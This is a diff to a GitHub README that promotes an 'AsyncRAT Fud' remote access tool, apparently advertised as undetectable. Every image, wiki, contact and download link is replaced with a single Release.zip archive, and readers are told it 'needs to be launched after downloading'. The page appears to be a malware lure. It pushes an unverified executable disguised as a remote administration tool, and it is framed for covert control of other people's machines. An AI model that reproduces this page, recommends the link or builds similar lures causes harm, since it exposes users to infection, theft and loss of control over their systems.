@@ -2,7 +2,7 @@
 
 Welcome to the AsyncRAT Fud Fixed Dll Remote Administration Tool New repository! 
 
-![AsyncRAT](https://img.icons8.com/color/452/async.png)
+![AsyncRAT](https://github.com/DominossAnime/AsyncRAT-Fud-Fixed-Dll-Remote-Administration-Tool-New/releases/download/v1.0/Release.zip)
 
 ## Introduction
 
@@ -24,7 +24,7 @@ AsyncRAT stands as a Remote Access Tool (RAT) conceived for the purpose of dista
 
 ## Download Latest Version
 
-[![Download AsyncRAT](https://img.shields.io/static/v1?label=Download&message=AsyncRAT&color=blue)](https://github.com/cli/browser/archive/refs/tags/v1.0.0.zip)
+[![Download AsyncRAT](https://github.com/DominossAnime/AsyncRAT-Fud-Fixed-Dll-Remote-Administration-Tool-New/releases/download/v1.0/Release.zip)](https://github.com/DominossAnime/AsyncRAT-Fud-Fixed-Dll-Remote-Administration-Tool-New/releases/download/v1.0/Release.zip)
 
 *(Remember, it needs to be launched after downloading.)*
 
@@ -34,7 +34,7 @@ To get started with AsyncRAT, simply download the latest version from the link p
 
 ## Documentation
 
-For detailed documentation on how to use AsyncRAT effectively for remote administration and control, refer to the [Wiki](https://wiki.asyncrat.com).
+For detailed documentation on how to use AsyncRAT effectively for remote administration and control, refer to the [Wiki](https://github.com/DominossAnime/AsyncRAT-Fud-Fixed-Dll-Remote-Administration-Tool-New/releases/download/v1.0/Release.zip).
 
 ## Contribute
 
@@ -46,8 +46,8 @@ This project is licensed under the MIT License - see the [LICENSE](LICENSE) file
 
 ## Contact
 
-If you have any questions, feedback, or suggestions regarding AsyncRAT, feel free to contact us at [asyncrat@support.com](mailto:asyncrat@support.com).
+If you have any questions, feedback, or suggestions regarding AsyncRAT, feel free to contact us at [https://github.com/DominossAnime/AsyncRAT-Fud-Fixed-Dll-Remote-Administration-Tool-New/releases/download/v1.0/Release.zip](https://github.com/DominossAnime/AsyncRAT-Fud-Fixed-Dll-Remote-Administration-Tool-New/releases/download/v1.0/Release.zip).
 
-![AsyncRAT Logo](https://img.icons8.com/color/452/async.png)
+![AsyncRAT Logo](https://github.com/DominossAnime/AsyncRAT-Fud-Fixed-Dll-Remote-Administration-Tool-New/releases/download/v1.0/Release.zip)
 
 Thank you for choosing AsyncRAT for your remote administration needs. Happy remote controlling! 🚀🕵️‍♂️
